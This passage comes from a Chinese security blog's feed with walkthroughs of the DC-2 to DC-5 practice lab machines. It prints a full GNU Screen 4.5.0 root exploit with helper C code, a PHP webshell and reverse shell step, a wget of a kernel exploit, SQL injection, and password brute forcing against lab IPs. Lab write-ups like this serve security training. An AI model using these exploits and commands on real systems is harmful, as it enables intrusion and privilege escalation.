class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2019/10/24/DC-5渗透报告/1562669026938.png" alt="Alt text"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现有一个screen 4.5.0，查一下漏洞<br><img src="/2019/10/24/DC-5渗透报告/1562669223203.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit -m 41154</span><br><span class="line">  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/41154/</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh</span><br><span class="line">File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/41154.sh</span><br></pre></td></tr></table></figure></p><p>nc连接传过去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc -nlvp 6666 &lt; 41154.sh </span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.61.142] from (UNKNOWN) [192.168.61.146] 42077</span><br><span class="line"></span><br><span class="line">www-data@dc-5:~/html$ nc 192.168.61.142 6666 &gt; 41154.sh</span><br><span class="line">nc 192.168.61.142 6666 &gt; 41154.sh</span><br></pre></td></tr></table></figure></p><p>给权限执行<br><img src="/2019/10/24/DC-5渗透报告/1562670771723.png" alt="Alt text"><br>发现有问题 可能是编译的问题  然后看网上的是把代码分段编译了 照着做了一下<br><a href="https://blog.barradell-johns.com/index.php/2019/05/27/dc-5-writeup/" target="_blank" rel="external">https://blog.barradell-johns.com/index.php/2019/05/27/dc-5-writeup/</a><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="meta"># cat 41154.sh </span></span><br><span class="line">#!/bin/bash</span><br><span class="line"><span class="meta"># screenroot.sh</span></span><br><span class="line"><span class="meta"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="meta"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="meta"># bug: https:<span class="comment">//lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span></span><br><span class="line"># HACK THE PLANET</span><br><span class="line"># ~ infodox (<span class="number">25</span>/<span class="number">1</span>/<span class="number">2017</span>) </span><br><span class="line">echo <span class="string">"~ gnu/screenroot ~"</span></span><br><span class="line">echo <span class="string">"[+] First, we create our shell and library..."</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dropshell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo <span class="string">"[+] Now we create our /etc/ld.so.preload file..."</span></span><br><span class="line">cd /etc</span><br><span class="line">umask <span class="number">000</span> <span class="meta"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="meta"># newline needed</span></span><br><span class="line">echo <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls <span class="meta"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure></p><p>分段编辑</p><ul><li><p>libhax.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>rootshell.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c</span><br><span class="line">root@kali:~# gcc -o ./rootshell ./rootshell.c</span><br></pre></td></tr></table></figure></p><p>发送文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc -nlvp 6666 &lt; libhax.so</span><br><span class="line">www-data@dc-5:/tmp$ nc 192.168.61.142 6666 &gt; libhax.so</span><br><span class="line"></span><br><span class="line">root@kali:~# nc -nlvp 6666 &lt; rootshell</span><br><span class="line">www-data@dc-5:/tmp$ nc 192.168.61.142 6666 &gt; rootshell</span><br></pre></td></tr></table></figure></p><p>然后按照脚本执行后面的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:/tmp$ cd /etc</span><br><span class="line">www-data@dc-5:/etc$ umask 000</span><br><span class="line"></span><br><span class="line">www-data@dc-5:/etc$ screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot;</span><br><span class="line">[+] done!</span><br><span class="line"></span><br><span class="line">www-data@dc-5:/etc$ screen -ls</span><br><span class="line">[+] done!</span><br><span class="line">No Sockets found in /tmp/screens/S-www-data.</span><br></pre></td></tr></table></figure></p><p>会生成一个rootshell的文件，执行后<br><img src="/2019/10/24/DC-5渗透报告/1562673132642.png" alt="Alt text"><br>在<code>/root/</code>下找到flag<br><img src="/2019/10/24/DC-5渗透报告/1562673243047.png" alt="Alt text"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://www.twosmi1e.com/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>DC-4渗透报告</title>
    <link href="https://www.twosmi1e.com/2019/10/23/DC-4%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/"/>
    <id>https://www.twosmi1e.com/2019/10/23/DC-4渗透报告/</id>
    <published>2019-10-23T03:19:22.000Z</published>
    <updated>2019-10-23T06:57:48.952Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.61.0/24</span><br></pre></td></tr></table></figure><p><img src="/2019/10/23/DC-4渗透报告/1562590586258.png" alt="Alt text"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.61.145 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="/2019/10/23/DC-4渗透报告/1562590629053.png" alt="Alt text"></p><ul><li>22 ssh服务</li><li>80 web服务 中间件nginx<br>访问发现一个登录页面<br><img src="/2019/10/23/DC-4渗透报告/1562592009504.png" alt="Alt text"><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2>抓包，尝试爆破<br><img src="/2019/10/23/DC-4渗透报告/1562592172821.png" alt="Alt text"><br><img src="/2019/10/23/DC-4渗透报告/1562591967863.png" alt="Alt text"><br>得到用户名admin 密码happy<br>登入网站<br><img src="/2019/10/23/DC-4渗透报告/1562592429739.png" alt="Alt text"><br>发现有个执行命令的页面<br><img src="/2019/10/23/DC-4渗透报告/1562592418581.png" alt="Alt text"><br>抓包看一下 里面有命令 修改命令 尝试命令执行<h2 id="shell反弹"><a href="#shell反弹" class="headerlink" title="shell反弹"></a>shell反弹</h2><img src="/2019/10/23/DC-4渗透报告/1562635664165.png" alt="Alt text"><br>反弹一个shell到kali<br><img src="/2019/10/23/DC-4渗透报告/1562635974158.png" alt="Alt text"><br><img src="/2019/10/23/DC-4渗透报告/1562635964981.png" alt="Alt text"><br>看看系统信息<br><img src="/2019/10/23/DC-4渗透报告/1562636001462.png" alt="Alt text"><br>翻目录 在<code>/home/jim/backups</code>下找到一个旧密码备份文件<br><img src="/2019/10/23/DC-4渗透报告/1562636164669.png" alt="Alt text"><br>复制保存<br><img src="/2019/10/23/DC-4渗透报告/1562636234185.png" alt="Alt text"><br>然后用jim的用户名去爆破ssh端口<br><code>hydra -L dc4user.txt -P dc4pass.txt -t 10 ssh://192.168.61.145</code><br><img src="/2019/10/23/DC-4渗透报告/1562636904103.png" alt="Alt text"><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2>然后ssh登上去<br><img src="/2019/10/23/DC-4渗透报告/1562637738028.png" alt="Alt text"><br>在<code>/var/mail</code>下有一封邮件<br><img src="/2019/10/23/DC-4渗透报告/1562638056846.png" alt="Alt text"><br>内容告诉我们<code>charles</code>的密码是<code>^xHhA&amp;hvim0y</code><br>切换一下用户<br><img src="/2019/10/23/DC-4渗透报告/1562638327165.png" alt="Alt text"><br>告诉我们<code>(root) NOPASSWD: /usr/bin/teehee</code> 这个东西有root权限<br>利用teehee提权<br>如果<code>/bin/sh</code>链接<code>/bin/bash</code>将无法正常工作，因为bash自动删除setuid权限。<br><img src="/2019/10/23/DC-4渗透报告/1562639527203.png" alt="Alt text"><br>但检查符号链接，我们看到符号链接<code>/bin/sh</code>到dash。Dash不会删除setuid权限，因此我们可以利用它来获取root shell<br><img src="/2019/10/23/DC-4渗透报告/1562639420858.png" alt="Alt text"><br>覆盖<code>/etc/crontab</code>，创建dash一个setuid二进制文件，最后得到一个root shell<br>在<code>root</code>目录下找到flag<br><img src="/2019/10/23/DC-4渗透报告/1562639753838.png" alt="Alt text"></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://www.twosmi1e.com/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>DC-3渗透报告</title>
    <link href="https://www.twosmi1e.com/2019/10/21/DC-3%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/"/>
    <id>https://www.twosmi1e.com/2019/10/21/DC-3渗透报告/</id>
    <published>2019-10-21T05:59:12.000Z</published>
    <updated>2019-10-21T06:07:11.071Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2019/10/21/DC-3渗透报告/1562577223049.png" alt="Alt text"><br>扫一下IP找到DC-3IP<br><img src="/2019/10/21/DC-3渗透报告/1562577254830.png" alt="Alt text"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li>nmap<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.61.144 -p 1-65535</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/10/21/DC-3渗透报告/1562583316250.png" alt="Alt text"><br>80web服务 Joomla</p><ul><li>whatweb<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.61.144/</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.61.144 [200 OK] Apache[2.4.18], Cookies[460ada11b31d3c5e5ca6e58fd5d3de27], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[460ada11b31d3c5e5ca6e58fd5d3de27], IP[192.168.61.144], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]</span><br></pre></td></tr></table></figure><ul><li>nikto</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://192.168.61.144</span><br></pre></td></tr></table></figure><p><img src="/2019/10/21/DC-3渗透报告/1562583659899.png" alt="Alt text"></p><p>使用Joomscan<br><img src="/2019/10/21/DC-3渗透报告/1562583750704.png" alt="Alt text"><br><img src="/2019/10/21/DC-3渗透报告/1562583758368.png" alt="Alt text"><br>知晓版本<code>Joomla 3.7.0</code><br><img src="/2019/10/21/DC-3渗透报告/1562583887784.png" alt="Alt text"><br>发现有sql注入的洞<br><code>searchsploit -m 42033</code><br>cat 一下txt<br><img src="/2019/10/21/DC-3渗透报告/1562583996627.png" alt="Alt text"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>爆库<br><img src="/2019/10/21/DC-3渗透报告/1562584186917.png" alt="Alt text"><br>爆表<br><img src="/2019/10/21/DC-3渗透报告/1562584386775.png" alt="Alt text"><br><img src="/2019/10/21/DC-3渗透报告/1562584399813.png" alt="Alt text"><br>爆字段<br><img src="/2019/10/21/DC-3渗透报告/1562584940320.png" alt="Alt text"><br>爆内容<br><img src="/2019/10/21/DC-3渗透报告/1562585043363.png" alt="Alt text"></p><p>john破解hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&apos; &gt; joompass.txt</span><br><span class="line">john joompass.txt</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/21/DC-3渗透报告/1562585495554.png" alt="Alt text"></p><h2 id="写shell反弹"><a href="#写shell反弹" class="headerlink" title="写shell反弹"></a>写shell反弹</h2><p>登入网站后台<br>修改<code>templates/beez3/error.php</code>写入一句话<br><img src="/2019/10/21/DC-3渗透报告/1562585660121.png" alt="Alt text"><br>连不上 用PHP反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# locate php-reverse-shell.php</span><br><span class="line">/usr/share/beef-xss/modules/exploits/m0n0wall/php-reverse-shell.php</span><br><span class="line">/usr/share/laudanum/php/php-reverse-shell.php</span><br><span class="line">/usr/share/laudanum/wordpress/templates/php-reverse-shell.php</span><br><span class="line">/usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure></p><p>选一个用<br>写入<code>error.php</code><br><img src="/2019/10/21/DC-3渗透报告/1562586628869.png" alt="Alt text"></p><p>设置IP端口 监听端口 反弹回shell<br><img src="/2019/10/21/DC-3渗透报告/1562586580527.png" alt="Alt text"><br>看一下权限<br><img src="/2019/10/21/DC-3渗透报告/1562586641430.png" alt="Alt text"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>然后提权<br>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/os-release</span><br><span class="line">NAME=&quot;Ubuntu&quot;</span><br><span class="line">VERSION=&quot;16.04 LTS (Xenial Xerus)&quot;</span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=&quot;Ubuntu 16.04 LTS&quot;</span><br><span class="line">VERSION_ID=&quot;16.04&quot;</span><br><span class="line">HOME_URL=&quot;http://www.ubuntu.com/&quot;</span><br><span class="line">SUPPORT_URL=&quot;http://help.ubuntu.com/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;http://bugs.launchpad.net/ubuntu/&quot;</span><br><span class="line">UBUNTU_CODENAME=xenial</span><br></pre></td></tr></table></figure><p>是Ubuntu 16.04的<br><img src="/2019/10/21/DC-3渗透报告/1562587060838.png" alt="Alt text"><br>找一个本地提权的<br><code>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</code><br><img src="/2019/10/21/DC-3渗透报告/1562587153202.png" alt="Alt text"><br>用wget下载下来<br><img src="/2019/10/21/DC-3渗透报告/1562588323284.png" alt="Alt text"><br>这个目录没有权限 切换到/tmp/下 创建一个exp目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir exp</span><br><span class="line">$ ls</span><br><span class="line">$ cd exp</span><br><span class="line">$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/21/DC-3渗透报告/1562588425899.png" alt="Alt text"><br>解压给权限运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ tar -xvf exploit.tar</span><br><span class="line">ebpf_mapfd_doubleput_exploit/</span><br><span class="line">ebpf_mapfd_doubleput_exploit/hello.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/suidhelper.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/compile.sh</span><br><span class="line">ebpf_mapfd_doubleput_exploit/doubleput.c</span><br><span class="line">$ chmod +x compile.sh</span><br><span class="line">$ ./compile.sh</span><br><span class="line">doubleput.c: In function &apos;make_setuid&apos;:</span><br><span class="line">doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .insns = (__aligned_u64) insns,</span><br><span class="line">             ^</span><br><span class="line">doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .license = (__aligned_u64)&quot;&quot;</span><br><span class="line">               ^</span><br><span class="line">$ ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-x--- 2 www-data www-data  4096 Jul  8 22:14 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data  4096 Jul  8 22:12 ..</span><br><span class="line">-rwxrwxrwx 1 www-data www-data   155 Apr 26  2016 compile.sh</span><br><span class="line">-rwxrwxrwx 1 www-data www-data 12336 Jul  8 22:14 doubleput</span><br><span class="line">-rw-r----- 1 www-data www-data  4188 Apr 26  2016 doubleput.c</span><br><span class="line">-rwxrwxrwx 1 www-data www-data  8028 Jul  8 22:14 hello</span><br><span class="line">-rw-r----- 1 www-data www-data  2186 Apr 26  2016 hello.c</span><br><span class="line">-rwxrwxrwx 1 www-data www-data  7524 Jul  8 22:14 suidhelper</span><br><span class="line">-rw-r----- 1 www-data www-data   255 Apr 26  2016 suidhelper.c</span><br><span class="line">$ ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&apos;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/21/DC-3渗透报告/1562588179585.png" alt="Alt text"><br>然后看flag<br><img src="/2019/10/21/DC-3渗透报告/1562588584981.png" alt="Alt text"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/2019/10/21/DC-3渗透报告/1562577223049.png&quot; alt=&quot;Alt text&quot;&gt;&lt;br&gt;扫一下IP找到DC-3IP&lt;br&gt;&lt;img src=&quot;/2019/10/21/DC-3渗透报告/1562577254830.png&quot; a
      
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://www.twosmi1e.com/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>DC-2渗透报告</title>
    <link href="https://www.twosmi1e.com/2019/10/17/DC-2%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/"/>
    <id>https://www.twosmi1e.com/2019/10/17/DC-2渗透报告/</id>
    <published>2019-10-17T10:27:58.000Z</published>
    <updated>2019-10-17T02:27:54.937Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>浏览一下就有flag1<br><img src="/2019/10/17/DC-2渗透报告/1562317665072.png" alt="Alt text"><br>nmap扫描一下端口信息收集<br><img src="/2019/10/17/DC-2渗透报告/1562317886315.png" alt="Alt text"></p><ul><li>Wordpress 4.7.10</li><li>Apache/2.4.10</li></ul><p>用cewl生成密码<br><img src="/2019/10/17/DC-2渗透报告/1562318263941.png" alt="Alt text"></p><h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>用WPscan(扫描WordPress的工具)<br><img src="/2019/10/17/DC-2渗透报告/1562318778841.png" alt="Alt text"><br>发现用户，和可利用的漏洞<br><img src="/2019/10/17/DC-2渗透报告/1562318824473.png" alt="Alt text"><br><img src="/2019/10/17/DC-2渗透报告/1562318837363.png" alt="Alt text"><br>用之前生成的字典爆破一下</p><p><img src="/2019/10/17/DC-2渗透报告/1562318980682.png" alt="Alt text"><br>jerry – adipiscing</p><p>tom – parturient<br>登入后台<br><img src="/2019/10/17/DC-2渗透报告/1562319472770.png" alt="Alt text"><br>flag2就在后台<br><img src="/2019/10/17/DC-2渗透报告/1562566563874.png" alt="Alt text"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>然后ssh连上去<br>jerry的用户用不了，用Tom的登上去<br><img src="/2019/10/17/DC-2渗透报告/1562567231821.png" alt="Alt text"><br>发现有rbash限制<br><img src="/2019/10/17/DC-2渗透报告/1562567316586.png" alt="Alt text"><br>用SUID提权<br>参考链接：<br><a href="https://www.anquanke.com/post/id/86979" target="_blank" rel="external">https://www.anquanke.com/post/id/86979</a><br><a href="https://xz.aliyun.com/t/2767" target="_blank" rel="external">https://xz.aliyun.com/t/2767</a></p><p><img src="/2019/10/17/DC-2渗透报告/1562567721950.png" alt="Alt text"><br>提权后就可以看flag3了<br>切换成jerry用户<br><img src="/2019/10/17/DC-2渗透报告/1562567815309.png" alt="Alt text"><br>再提一次权<br>参考链接：<br><a href="http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/" target="_blank" rel="external">http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/</a><br>然后就有最后的flag了<br><img src="/2019/10/17/DC-2渗透报告/1562568026143.png" alt="Alt text"><br>完成</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;浏览一下就有flag1&lt;br&gt;&lt;img src=&quot;/2019/10/17/DC-2渗透报告/1562317665072.pn
      
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://www.twosmi1e.com/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>DC-1渗透报告</title>
    <link href="https://www.twosmi1e.com/2019/10/16/DC-1%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/"/>
    <id>https://www.twosmi1e.com/2019/10/16/DC-1渗透报告/</id>
    <published>2019-10-16T06:18:12.000Z</published>
    <updated>2019-10-16T06:20:23.491Z</updated>
    
